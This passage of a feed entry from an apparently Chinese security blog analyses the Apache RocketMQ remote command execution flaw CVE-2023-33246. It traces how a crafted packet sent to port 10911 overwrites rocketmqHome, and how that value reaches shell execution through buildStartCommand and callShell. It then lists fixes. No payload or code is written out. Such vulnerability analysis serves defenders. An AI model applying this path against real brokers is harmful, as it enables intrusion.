+<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720165303285.png" referrerpolicy="no-referrer" alt="image-20230720165303285"></p>
+<p>在进行<code>filterServerManager</code>启动过程中会以30S的频率轮询创建<code>filterServer</code></p>
+<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720165452954.png" referrerpolicy="no-referrer" alt="image-20230720165452954"></p>
+<p>创建<code>filterServer</code>时调用方法<code>org.apache.rocketmq.broker.filtersrv.FilterServerManager#buildStartCommand</code>解析数据拼接参数</p>
+<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720165739570.png" referrerpolicy="no-referrer" alt="image-20230720165739570"></p>
+<p>在进行参数拼接过程中会从<code>brokerConfig</code>中获取<code>rocketmqHome</code>与<code>namesrvAddr</code>两个值。</p>
+<p>我们可以通过模拟RocketMQ协议向10911端口发送特制的数据包来影响<code>rocketmqHome</code>的值为可控的值，又因应用在进行命令拼接过程中未对用户的输入值进行有效的过滤，从而导致任意命令执行，此时我们使用网络上公开的PoC向10911端口发送数据然后调试</p>
+<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720170706116.png" referrerpolicy="no-referrer" alt="image-20230720170706116"></p>
+<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720170558173.png" referrerpolicy="no-referrer" alt="image-20230720170558173"></p>
+<p>可以看到，此时获取的<code>rocketmqHome</code>值已经变更为我们输入的Payload</p>
+<p>在<code>buildStartCommand</code>方法调用完毕后，会返回拼接的字符串然后调用<code>org.apache.rocketmq.broker.filtersrv.FilterServerUtil#callShell</code>方法进行命令执行</p>
+<p>整个流程的调用栈为</p>
+<p><img src="/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/image-20230720171016289.png" referrerpolicy="no-referrer" alt="image-20230720171016289"></p>
+<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>1、非必须勿向互联网开放不必要的服务端口，控制暴露面；</p>
+<p>2、关键服务增加用户权限校验；</p>
+<p>3、升级软件到不受影响的版本或最新版。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246</a></li>
+<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-33246">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-33246</a></li>
+<li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101</a></li>
+</ul>
+<h2 id="软安解决方案"><a href="#软安解决方案" class="headerlink" title="软安解决方案"></a>软安解决方案</h2>]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>Apache RocketMQ</tag>
+        <tag>RCE</tag>
+        <tag>远程代码执行</tag>
+        <tag>反序列化</tag>
+        <tag>网络安全</tag>
+        <tag>漏洞分析</tag>
+        <tag>漏洞</tag>
+        <tag>CVE-2023-33246</tag>
       </tags>
   </entry>
   <entry>
